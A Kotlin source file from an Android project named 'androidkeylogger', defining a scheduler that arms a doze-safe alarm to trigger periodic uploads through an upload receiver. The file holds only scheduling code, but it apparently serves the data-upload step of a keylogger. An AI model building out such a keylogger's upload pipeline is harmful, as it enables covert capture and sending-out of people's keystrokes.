package com.bshu2.androidkeylogger

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/** Inexact, doze-safe trigger; exactness is unnecessary for log rotation. */
object AlarmScheduler {
    private const val REQUEST_CODE = 4021

    fun schedule(ctx: Context) {
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as? AlarmManager
        if (am == null) {
            Log.e(UploadPipeline.TAG, "no AlarmManager; automatic uploads disabled")
            return
        }
        val interval = Prefs.intervalMs(ctx)
        val triggerAt = System.currentTimeMillis() + interval
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending(ctx))
            } else {
                am.set(AlarmManager.RTC_WAKEUP, triggerAt, pending(ctx))
            }
            Log.d(UploadPipeline.TAG, "alarm armed in ${interval}ms")
        } catch (e: Exception) {
            Log.e(UploadPipeline.TAG, "could not arm alarm", e)
        }
    }

    fun cancel(ctx: Context) {
        val am = ctx.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
        try {
            am.cancel(pending(ctx))
        } catch (e: Exception) {
            Log.e(UploadPipeline.TAG, "could not cancel alarm", e)
        }
    }

    private fun pending(ctx: Context): PendingIntent {
        val intent = Intent(ctx, UploadReceiver::class.java)
            .setAction(UploadReceiver.ACTION_UPLOAD)
        var flags = PendingIntent.FLAG_UPDATE_CURRENT
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) flags = flags or PendingIntent.FLAG_IMMUTABLE
        return PendingIntent.getBroadcast(ctx, REQUEST_CODE, intent, flags)
    }
}
